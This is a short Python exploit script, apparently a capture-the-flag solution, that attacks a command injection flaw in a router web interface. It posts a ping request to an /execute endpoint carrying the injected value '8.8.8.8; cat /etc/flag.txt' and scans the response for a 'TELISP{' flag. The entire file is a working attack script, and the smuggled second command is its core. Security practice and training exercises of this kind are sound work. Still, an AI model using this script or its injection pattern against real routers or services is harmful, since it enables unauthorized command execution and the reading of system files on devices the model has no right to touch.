#!/usr/bin/env python3
import requests
import sys
import urllib.parse
import base64

def exploit_command_injection(url, payload):
    """
    Exploit command injection vulnerability in the router UI
    """
    try:
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Send the request
        data = {
            'command': encoded_payload,
            'type': 'ping'
        }
        
        response = requests.post(f"{url}/execute", json=data)
        
        # Check if we got the flag
        if "TELISP{" in response.text:
            print("[+] Success! Found flag:")
            print(response.text.split("TELISP{")[1].split("}")[0])
            return True
        else:
            print("[-] No flag found in response")
            return False
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 command_injection.py <target_url>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    payload = "8.8.8.8; cat /etc/flag.txt"
    
    print("[*] Attempting command injection...")
    exploit_command_injection(target_url, payload) 